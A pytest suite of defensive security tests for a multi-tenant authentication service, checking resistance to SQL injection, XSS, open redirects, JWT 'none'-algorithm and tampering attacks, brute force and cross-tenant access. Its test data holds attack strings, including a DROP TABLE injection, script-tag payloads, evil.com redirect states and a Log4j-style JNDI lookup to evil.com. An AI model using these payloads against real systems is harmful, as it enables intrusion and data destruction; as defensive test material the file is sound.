"""
Comprehensive security vulnerability tests for authentication
Tests against OWASP Top 10 and common authentication vulnerabilities
"""

import pytest
import time
from datetime import datetime, timedelta
from unittest.mock import patch

from app.models.auth_models import UserCreate, LoginRequest, AuthProvider, UserRole
from app.services.auth_service import AuthenticationService
from app.core.exceptions import InvalidCredentialsError
from tests.fixtures.auth_test_fixtures import *


class TestSQLInjectionPrevention:
    """Test SQL injection prevention in authentication."""
    
    @pytest.mark.asyncio
    async def test_sql_injection_in_login(self, auth_service: AuthenticationService, test_tenant, sql_injection_payloads):
        """Test SQL injection attempts in login form."""
        for payload in sql_injection_payloads:
            login_request = LoginRequest(
                email=payload,  # SQL injection in email field
                password="password123",
                provider=AuthProvider.LOCAL,
                ip_address="192.168.1.100",
                user_agent="Mozilla/5.0 Test Browser"
            )
            
            # Should not cause SQL injection - should fail safely
            with pytest.raises(InvalidCredentialsError):
                await auth_service.authenticate_user(login_request, test_tenant.id)
    
    @pytest.mark.asyncio
    async def test_sql_injection_in_user_creation(self, auth_service: AuthenticationService, test_tenant, sql_injection_payloads):
        """Test SQL injection attempts in user creation."""
        for i, payload in enumerate(sql_injection_payloads):
            user_data = UserCreate(
                tenant_id=test_tenant.id,
                email=f"sqli{i}@example.com",
                first_name=payload,  # SQL injection in first name
                last_name="Test",
                password="Password123!",
                role=UserRole.DEVELOPER
            )
            
            # Should safely store the payload as literal text
            user = await auth_service.create_user(user_data)
            assert user is not None
            assert user.first_name == payload  # Should be stored as literal string
    
    @pytest.mark.asyncio
    async def test_sql_injection_in_password_reset(self, auth_service: AuthenticationService, test_tenant, sql_injection_payloads):
        """Test SQL injection attempts in password reset."""
        for payload in sql_injection_payloads:
            # Try to reset password with SQL injection in token
            success = await auth_service.reset_password(
                payload,  # SQL injection in token
                "NewPassword123!",
                test_tenant.id
            )
            
            # Should safely fail without causing injection
            assert success is False
    
    @pytest.mark.asyncio
    async def test_sql_injection_in_email_verification(self, auth_service: AuthenticationService, test_tenant, sql_injection_payloads):
        """Test SQL injection attempts in email verification."""
        for payload in sql_injection_payloads:
            # Try to verify email with SQL injection in token
            success = await auth_service.verify_email_token(payload, test_tenant.id)
            
            # Should safely fail without causing injection
            assert success is False


class TestXSSPrevention:
    """Test Cross-Site Scripting (XSS) prevention."""
    
    @pytest.mark.asyncio
    async def test_xss_in_user_registration(self, auth_service: AuthenticationService, test_tenant, xss_payloads):
        """Test XSS prevention in user registration."""
        for i, payload in enumerate(xss_payloads):
            user_data = UserCreate(
                tenant_id=test_tenant.id,
                email=f"xss{i}@example.com",
                first_name=payload,  # XSS payload in name
                last_name="Test",
                password="Password123!",
                role=UserRole.DEVELOPER
            )
            
            # Should safely store XSS payload without executing it
            user = await auth_service.create_user(user_data)
            assert user is not None
            assert user.first_name == payload  # Stored as literal string
    
    @pytest.mark.asyncio
    async def test_xss_in_api_responses(self, auth_test_client, test_tenant, xss_payloads):
        """Test XSS prevention in API responses."""
        for i, payload in enumerate(xss_payloads):
            # Try to register user with XSS payload
            with patch('app.middleware.tenant_middleware.require_tenant') as mock_tenant:
                mock_tenant.return_value = test_tenant
                
                response = auth_test_client.post(
                    "/api/v1/auth/register",
                    json={
                        "email": f"xss_api{i}@example.com",
                        "first_name": payload,
                        "last_name": "Test",
                        "password": "Password123!",
                        "role": "developer"
                    }
                )
                
                # Response should not execute XSS
                assert response.status_code in [200, 400]
                
                if response.status_code == 200:
                    # Check that XSS payload is properly escaped in response
                    response_text = response.text
                    # Basic XSS prevention - no script tags should be unescaped
                    assert "<script>" not in response_text.lower()
                    assert "javascript:" not in response_text.lower()
    
    @pytest.mark.asyncio
    async def test_xss_in_error_messages(self, auth_test_client, test_tenant, xss_payloads):
        """Test XSS prevention in error messages."""
        for payload in xss_payloads:
            with patch('app.middleware.tenant_middleware.require_tenant') as mock_tenant:
                mock_tenant.return_value = test_tenant
                
                # Try login with XSS payload in email
                response = auth_test_client.post(
                    "/api/v1/auth/login",
                    json={
                        "email": payload,
                        "password": "password123",
                        "provider": "local"
                    }
                )
                
                # Error messages should not contain unescaped XSS
                assert response.status_code in [401, 422]
                error_text = response.text.lower()
                assert "<script>" not in error_text
                assert "javascript:" not in error_text


class TestCSRFPrevention:
    """Test Cross-Site Request Forgery (CSRF) prevention."""
    
    @pytest.mark.asyncio
    async def test_state_parameter_validation(self, auth_test_client, test_tenant):
        """Test CSRF prevention via state parameter validation."""
        # Test OAuth callback without proper state
        response = auth_test_client.get(
            "/api/v1/auth/sso/google/callback",
            params={
                "code": "valid_auth_code",
                "state": "tampered_state"  # Potentially tampered state
            }
        )
        
        # Should handle state validation (current implementation redirects)
        assert response.status_code in [200, 307, 401, 400]
    
    @pytest.mark.asyncio
    async def test_saml_relay_state_validation(self, auth_test_client):
        """Test CSRF prevention in SAML relay state."""
        # Test SAML callback with potentially malicious relay state
        malicious_states = [
            "javascript:alert('xss')",
            "data:text/html,<script>alert('xss')</script>",
            "//evil.com/redirect",
            "http://evil.com/phishing"
        ]
        
        for state in malicious_states:
            response = auth_test_client.post(
                "/api/v1/auth/saml/sso",
                data={
                    "SAMLResponse": "mock_saml_response",
                    "RelayState": state
                }
            )
            
            # Should not redirect to malicious URLs
            if response.status_code == 307:  # Redirect
                location = response.headers.get("location", "")
                assert not location.startswith("javascript:")
                assert not location.startswith("data:")
                assert "evil.com" not in location
    
    @pytest.mark.asyncio
    async def test_origin_validation(self, auth_test_client, test_tenant):
        """Test origin validation for sensitive operations."""
        malicious_origins = [
            "http://evil.com",
            "https://phishing.example.com",
            "javascript:alert('xss')"
        ]
        
        for origin in malicious_origins:
            headers = {
                "Origin": origin,
                "Content-Type": "application/json"
            }
            
            with patch('app.middleware.tenant_middleware.require_tenant') as mock_tenant:
                mock_tenant.return_value = test_tenant
                
                response = auth_test_client.post(
                    "/api/v1/auth/login",
                    json={
                        "email": "test@example.com",
                        "password": "password123",
                        "provider": "local"
                    },
                    headers=headers
                )
                
                # Should handle requests from any origin (API design)
                # But should not leak sensitive information
                assert response.status_code in [200, 401, 422]


class TestSessionSecurity:
    """Test session security vulnerabilities."""
    
    @pytest.mark.asyncio
    async def test_session_fixation_prevention(self, auth_service: AuthenticationService, test_user: User, test_tenant):
        """Test prevention of session fixation attacks."""
        # Create initial session
        login_request = LoginRequest(
            email=test_user.email,
            password="SecurePassword123!",
            provider=AuthProvider.LOCAL,
            ip_address="192.168.1.100",
            user_agent="Mozilla/5.0 Test Browser"
        )
        
        session1 = await auth_service._create_user_session(test_user, login_request)
        tokens1 = await auth_service._generate_tokens(test_user, session1)
        
        # Create another session (should get different session ID)
        session2 = await auth_service._create_user_session(test_user, login_request)
        tokens2 = await auth_service._generate_tokens(test_user, session2)
        
        # Sessions should be different (preventing fixation)
        assert session1.id != session2.id
        assert tokens1["access_token"] != tokens2["access_token"]
        assert tokens1["refresh_token"] != tokens2["refresh_token"]
    
    @pytest.mark.asyncio
    async def test_session_hijacking_prevention(self, auth_service: AuthenticationService, test_user: User):
        """Test prevention of session hijacking."""
        # Create session from one IP
        login_request1 = LoginRequest(
            email=test_user.email,
            password="SecurePassword123!",
            provider=AuthProvider.LOCAL,
            ip_address="192.168.1.100",
            user_agent="Mozilla/5.0 (Windows NT 10.0) Chrome"
        )
        session1 = await auth_service._create_user_session(test_user, login_request1)
        tokens1 = await auth_service._generate_tokens(test_user, session1)
        
        # Try to use session from different IP/User-Agent (potential hijacking)
        login_request2 = LoginRequest(
            email=test_user.email,
            password="SecurePassword123!",
            provider=AuthProvider.LOCAL,
            ip_address="203.0.113.1",  # Different IP
            user_agent="Mozilla/5.0 (Linux) Firefox"  # Different browser
        )
        
        # In a full implementation, this might trigger security alerts
        # For now, just verify that sessions track this information
        session2 = await auth_service._create_user_session(test_user, login_request2)
        
        assert session1.ip_address != session2.ip_address
        assert session1.user_agent != session2.user_agent
    
    @pytest.mark.asyncio
    async def test_concurrent_session_limits(self, auth_service: AuthenticationService, test_user: User):
        """Test concurrent session limits to prevent abuse."""
        login_request = LoginRequest(
            email=test_user.email,
            password="SecurePassword123!",
            provider=AuthProvider.LOCAL,
            ip_address="192.168.1.100",
            user_agent="Mozilla/5.0 Test Browser"
        )
        
        # Create many sessions
        sessions = []
        max_attempts = 50
        
        for i in range(max_attempts):
            try:
                session = await auth_service._create_user_session(test_user, login_request)
                sessions.append(session)
            except Exception:
                # Some limit might be enforced
                break
        
        # Should allow reasonable number of concurrent sessions
        # Current implementation doesn't limit, but that's a design choice
        assert len(sessions) > 0
        
        # All sessions should be valid
        for session in sessions[:5]:  # Check first 5
            assert session.user_id == test_user.id


class TestTokenSecurity:
    """Test JWT token security vulnerabilities."""
    
    @pytest.mark.asyncio
    async def test_token_algorithm_confusion(self, auth_service: AuthenticationService, test_user: User, user_session: UserSession):
        """Test prevention of algorithm confusion attacks."""
        import jwt
        
        # Try to create token with 'none' algorithm
        payload = {
            "user_id": str(test_user.id),
            "tenant_id": str(test_user.tenant_id),
            "exp": (datetime.utcnow() + timedelta(hours=1)).timestamp(),
            "type": "access"
        }
        
        # Create unsigned token (algorithm confusion attack)
        none_token = jwt.encode(payload, "", algorithm="none")
        
        # Should reject 'none' algorithm tokens
        with pytest.raises(InvalidCredentialsError):
            await auth_service.verify_token(none_token)
    
    @pytest.mark.asyncio
    async def test_token_signature_verification(self, auth_service: AuthenticationService, test_user: User, user_session: UserSession):
        """Test that token signatures are properly verified."""
        import jwt
        
        # Generate valid token
        tokens = await auth_service._generate_tokens(test_user, user_session)
        access_token = tokens["access_token"]
        
        # Tamper with token signature
        parts = access_token.split('.')
        tampered_signature = parts[2][:-5] + "AAAAA"  # Change last 5 chars
        tampered_token = f"{parts[0]}.{parts[1]}.{tampered_signature}"
        
        # Should reject tampered token
        with pytest.raises(InvalidCredentialsError):
            await auth_service.verify_token(tampered_token)
    
    @pytest.mark.asyncio
    async def test_token_payload_tampering(self, auth_service: AuthenticationService, test_user: User, user_session: UserSession):
        """Test detection of payload tampering."""
        import jwt
        import json
        import base64
        
        # Generate valid token
        tokens = await auth_service._generate_tokens(test_user, user_session)
        access_token = tokens["access_token"]
        
        # Split token
        header, payload, signature = access_token.split('.')
        
        # Decode and tamper with payload
        payload_padded = payload + '=' * (4 - len(payload) % 4)
        decoded_payload = json.loads(base64.urlsafe_b64decode(payload_padded))
        
        # Tamper with payload (privilege escalation)
        decoded_payload["role"] = "admin"
        
        # Re-encode payload
        tampered_payload_bytes = json.dumps(decoded_payload).encode()
        tampered_payload = base64.urlsafe_b64encode(tampered_payload_bytes).decode().rstrip('=')
        
        # Create tampered token
        tampered_token = f"{header}.{tampered_payload}.{signature}"
        
        # Should reject tampered token (signature won't match)
        with pytest.raises(InvalidCredentialsError):
            await auth_service.verify_token(tampered_token)
    
    @pytest.mark.asyncio
    async def test_token_replay_attacks(self, auth_service: AuthenticationService, valid_jwt_tokens):
        """Test token replay attack prevention."""
        access_token = valid_jwt_tokens["access_token"]
        
        # Use token multiple times (should be allowed for access tokens)
        for _ in range(5):
            payload = await auth_service.verify_token(access_token)
            assert payload is not None
        
        # Access tokens can be used multiple times within expiry
        # Replay protection would be implemented at application level
        # or through short token expiry + refresh pattern
    
    @pytest.mark.asyncio
    async def test_token_side_channel_attacks(self, auth_service: AuthenticationService, valid_jwt_tokens):
        """Test protection against side-channel attacks on token validation."""
        valid_token = valid_jwt_tokens["access_token"]
        invalid_tokens = [
            "invalid.token.here",
            valid_token[:-5] + "AAAAA",  # Wrong signature
            valid_token.replace('e', 'E'),  # Case change
            "",  # Empty token
            "Bearer " + valid_token,  # Wrong format
        ]
        
        # Measure timing for valid token
        start_time = time.time()
        try:
            await auth_service.verify_token(valid_token)
        except:
            pass
        valid_time = time.time() - start_time
        
        # Measure timing for invalid tokens
        invalid_times = []
        for invalid_token in invalid_tokens:
            start_time = time.time()
            try:
                await auth_service.verify_token(invalid_token)
            except:
                pass
            invalid_time = time.time() - start_time
            invalid_times.append(invalid_time)
        
        # Timing should be relatively consistent to prevent side-channel attacks
        avg_invalid_time = sum(invalid_times) / len(invalid_times)
        time_difference = abs(valid_time - avg_invalid_time)
        
        # Should not leak timing information (within 10ms tolerance)
        assert time_difference < 0.01


class TestPasswordSecurity:
    """Test password-related security vulnerabilities."""
    
    @pytest.mark.asyncio
    async def test_password_brute_force_protection(self, auth_service: AuthenticationService, test_user: User, test_tenant):
        """Test protection against password brute force attacks."""
        failed_attempts = 0
        max_attempts = 10
        
        for i in range(max_attempts):
            login_request = LoginRequest(
                email=test_user.email,
                password=f"wrong_password_{i}",
                provider=AuthProvider.LOCAL,
                ip_address="192.168.1.100",
                user_agent="Mozilla/5.0 Test Browser"
            )
            
            try:
                await auth_service.authenticate_user(login_request, test_tenant.id)
            except InvalidCredentialsError:
                failed_attempts += 1
            
            # After enough attempts, account should be locked
            current_user = await auth_service.get_user_by_id(test_user.id, test_tenant.id)
            if current_user.locked_until and current_user.locked_until > datetime.utcnow():
                print(f"Account locked after {failed_attempts} failed attempts")
                break
        
        # Should implement some form of brute force protection
        assert failed_attempts >= 5  # Should track failed attempts
    
    @pytest.mark.asyncio
    async def test_password_timing_attack_prevention(self, auth_service: AuthenticationService, test_user: User):
        """Test prevention of password timing attacks."""
        # Test with correct password
        start_time = time.time()
        result1 = await auth_service._authenticate_local(test_user, "SecurePassword123!")
        correct_time = time.time() - start_time
        
        # Test with wrong passwords of different lengths
        wrong_passwords = ["a", "wrong", "very_long_wrong_password_here"]
        wrong_times = []
        
        for wrong_password in wrong_passwords:
            start_time = time.time()
            result2 = await auth_service._authenticate_local(test_user, wrong_password)
            wrong_time = time.time() - start_time
            wrong_times.append(wrong_time)
            assert result2 is False
        
        assert result1 is True
        
        # All password verification times should be similar
        for wrong_time in wrong_times:
            time_diff = abs(correct_time - wrong_time)
            assert time_diff < 0.01  # Within 10ms
    
    @pytest.mark.asyncio
    async def test_password_storage_security(self, auth_service: AuthenticationService, test_tenant):
        """Test secure password storage."""
        password = "TestPassword123!"
        
        user_data = UserCreate(
            tenant_id=test_tenant.id,
            email="storage_test@example.com",
            first_name="Storage",
            last_name="Test",
            password=password,
            role=UserRole.DEVELOPER
        )
        
        user = await auth_service.create_user(user_data)
        
        # Password should never be stored in plain text
        assert user.password_hash != password
        assert password not in user.password_hash
        
        # Should use bcrypt (strong hashing)
        assert user.password_hash.startswith('$2b$')
        
        # Should verify correctly
        assert await auth_service._authenticate_local(user, password)
        assert not await auth_service._authenticate_local(user, "wrong_password")


class TestInputValidation:
    """Test input validation security."""
    
    @pytest.mark.asyncio
    async def test_email_validation_bypass(self, auth_service: AuthenticationService, test_tenant):
        """Test email validation bypass attempts."""
        invalid_emails = [
            "admin@localhost",  # Localhost
            "test@127.0.0.1",   # IP address
            "user@.com",        # Invalid domain
            "user..test@example.com",  # Double dots
            "user@exam\x00ple.com",    # Null byte injection
            "user@example.com\r\n",   # CRLF injection
            "user@example.com<script>",  # XSS attempt
        ]
        
        for invalid_email in invalid_emails:
            user_data = UserCreate(
                tenant_id=test_tenant.id,
                email=invalid_email,
                first_name="Test",
                last_name="User",
                password="Password123!",
                role=UserRole.DEVELOPER
            )
            
            try:
                # Should either accept as literal string or reject
                user = await auth_service.create_user(user_data)
                if user:
                    # If accepted, should be stored as literal string
                    assert user.email == invalid_email
            except ValueError:
                # Validation rejection is acceptable
                pass
    
    @pytest.mark.asyncio
    async def test_name_field_injection(self, auth_service: AuthenticationService, test_tenant):
        """Test injection attempts in name fields."""
        injection_payloads = [
            "Robert'; DROP TABLE users; --",
            "Alice<script>alert('xss')</script>",
            "Bob\x00Admin",  # Null byte
            "Charlie\r\nAdmin: true",  # CRLF injection
            "David${jndi:ldap://evil.com/}",  # Log4j style
        ]
        
        for i, payload in enumerate(injection_payloads):
            user_data = UserCreate(
                tenant_id=test_tenant.id,
                email=f"injection{i}@example.com",
                first_name=payload,
                last_name="Test",
                password="Password123!",
                role=UserRole.DEVELOPER
            )
            
            # Should safely store as literal string
            user = await auth_service.create_user(user_data)
            assert user is not None
            assert user.first_name == payload
    
    @pytest.mark.asyncio
    async def test_password_field_limits(self, auth_service: AuthenticationService, test_tenant):
        """Test password field limits and validation."""
        # Test extremely long password
        very_long_password = "A" * 10000
        
        user_data = UserCreate(
            tenant_id=test_tenant.id,
            email="longpass@example.com",
            first_name="Long",
            last_name="Password",
            password=very_long_password,
            role=UserRole.DEVELOPER
        )
        
        # Should handle long passwords gracefully
        try:
            user = await auth_service.create_user(user_data)
            # If accepted, should be properly hashed
            assert user.password_hash is not None
            assert user.password_hash != very_long_password
        except ValueError:
            # Length limit rejection is acceptable
            pass
    
    @pytest.mark.asyncio
    async def test_unicode_handling(self, auth_service: AuthenticationService, test_tenant):
        """Test Unicode handling in input fields."""
        unicode_inputs = [
            "José María",  # Accented characters
            "محمد عبدالله",  # Arabic
            "张三",        # Chinese
            "🙂😀💯",      # Emojis
            "Iñtërnâtiônàlizætiøn",  # Mixed
        ]
        
        for i, unicode_input in enumerate(unicode_inputs):
            user_data = UserCreate(
                tenant_id=test_tenant.id,
                email=f"unicode{i}@example.com",
                first_name=unicode_input,
                last_name="Test",
                password="Password123!",
                role=UserRole.DEVELOPER
            )
            
            # Should handle Unicode properly
            user = await auth_service.create_user(user_data)
            assert user is not None
            assert user.first_name == unicode_input


class TestAuthorizationBypass:
    """Test authorization bypass vulnerabilities."""
    
    @pytest.mark.asyncio
    async def test_privilege_escalation_via_token(self, auth_service: AuthenticationService, test_user: User, user_session: UserSession):
        """Test prevention of privilege escalation via token manipulation."""
        # Generate normal user token
        tokens = await auth_service._generate_tokens(test_user, user_session)
        
        # Verify token contains correct role
        payload = await auth_service.verify_token(tokens["access_token"])
        assert payload["role"] == test_user.role
        
        # Any attempt to modify the token would break signature verification
        # which is tested in TestTokenSecurity
    
    @pytest.mark.asyncio
    async def test_horizontal_privilege_escalation(self, auth_service: AuthenticationService, test_user: User, cross_tenant_user: User):
        """Test prevention of horizontal privilege escalation."""
        # Create session for primary user
        login_request = LoginRequest(
            email=test_user.email,
            password="SecurePassword123!",
            provider=AuthProvider.LOCAL,
            ip_address="192.168.1.100",
            user_agent="Mozilla/5.0 Test Browser"
        )
        session = await auth_service._create_user_session(test_user, login_request)
        tokens = await auth_service._generate_tokens(test_user, session)
        
        # Verify token is scoped to correct tenant
        payload = await auth_service.verify_token(tokens["access_token"])
        assert payload["tenant_id"] == str(test_user.tenant_id)
        assert payload["tenant_id"] != str(cross_tenant_user.tenant_id)
    
    @pytest.mark.asyncio
    async def test_direct_object_reference(self, auth_service: AuthenticationService, test_user: User, cross_tenant_user: User, test_tenant, secondary_tenant):
        """Test prevention of insecure direct object references."""
        # Try to access cross-tenant user by ID
        accessed_user = await auth_service.get_user_by_id(cross_tenant_user.id, test_tenant.id)
        
        # Should not be able to access user from different tenant
        assert accessed_user is None
        
        # Should be able to access user from correct tenant
        correct_user = await auth_service.get_user_by_id(test_user.id, test_tenant.id)
        assert correct_user is not None
        assert correct_user.id == test_user.id